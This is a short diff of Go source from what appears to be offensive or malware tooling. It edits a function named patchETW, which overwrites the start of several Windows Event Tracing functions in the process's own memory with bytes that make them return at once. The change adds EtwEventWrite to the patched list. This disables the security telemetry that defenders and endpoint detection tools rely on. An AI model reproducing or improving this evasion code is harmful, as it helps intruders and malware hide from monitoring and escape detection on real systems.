@@ -120,7 +120,7 @@ func WriteProcessMemory(hProcess uintptr, lpBaseAddress uintptr, lpBuffer *byte,
 
 func patchETW() {
 	handle := uintptr(0xffffffffffffffff)
-	dataAddr := []uintptr{ procEtwNotificationRegister.Addr(), procEtwEventRegister.Addr(), procEtwEventWriteFull.Addr(), procEtwEventWriteFull.Addr()}
+	dataAddr := []uintptr{ procEtwNotificationRegister.Addr(), procEtwEventRegister.Addr(), procEtwEventWriteFull.Addr(), procEtwEventWrite.Addr()}
 	for i, _ := range dataAddr {
 		data, _ := hex.DecodeString("4833C0C3")
 		var nLength uintptr
